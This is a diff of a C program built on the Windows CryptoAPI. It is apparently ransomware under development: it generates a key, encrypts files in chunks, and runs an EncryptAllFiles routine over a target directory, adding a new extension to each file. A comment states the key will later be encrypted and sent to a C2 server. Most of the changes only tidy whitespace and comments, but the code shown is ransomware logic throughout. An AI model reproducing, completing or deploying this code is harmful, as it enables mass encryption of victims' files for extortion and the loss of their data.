@@ -9,6 +9,7 @@
 
 #define CHUNK_SIZE 4096
 
+
 // I had to build my own strcat function to handle with the runtime exception thrown when
 //      appending a string to a big enough string and overflowing the MaxSize
 errno_t my_strcat_s(char* destinationStr, size_t MaxSize, const char* sourceStr) {
@@ -103,7 +104,7 @@ BOOL EncryptMyFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTK
     while (ReadFile(hInputFile, buffer, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
         finalChunk = (bytesRead < CHUNK_SIZE);  // the final chunk will be smaller thant CHUNK_SIZE
 
-            // Encrypt the chunk
+        // Encrypt the chunk
         if (!CryptEncrypt(hKey, 0, finalChunk, 0, buffer, &bytesRead, CHUNK_SIZE)) {
             printf("Error: CryptEncrypt failed. Error Code: %lu\n", GetLastError());
             printf("Failure encrypting file %s\n", inputFileName);
@@ -236,12 +237,11 @@ int main() {
         printf("Error: CryptGenKey failed. Error Code: %lu\n", GetLastError());
         return 0;
     }
-    /**********************************************************************************************/
 
-        // print the key to a file (this will change to encrypt the key and send it to a C2 server
+    // print the key to a file (this will change to encrypt the key and send it to a C2 server
     PrintKey(hCryptProv, hKey);
-    //    EncryptMyFile(inputFileName, cryptoFileExt, hKey);
-        // encrypt a file
+
+    // encrypt a file
     fileNumber = EncryptAllFiles(targetDir, cryptoFileExt, hKey);
     printf("%zd files encrypted.\n", fileNumber);
 
@@ -259,7 +259,6 @@ int main() {
             printf("Error during CryptReleaseContext!. Error code: %lu\n", GetLastError());
         }
     }
-
 
     // Get the end time
     GetSystemTimeAsFileTime(&endTime);
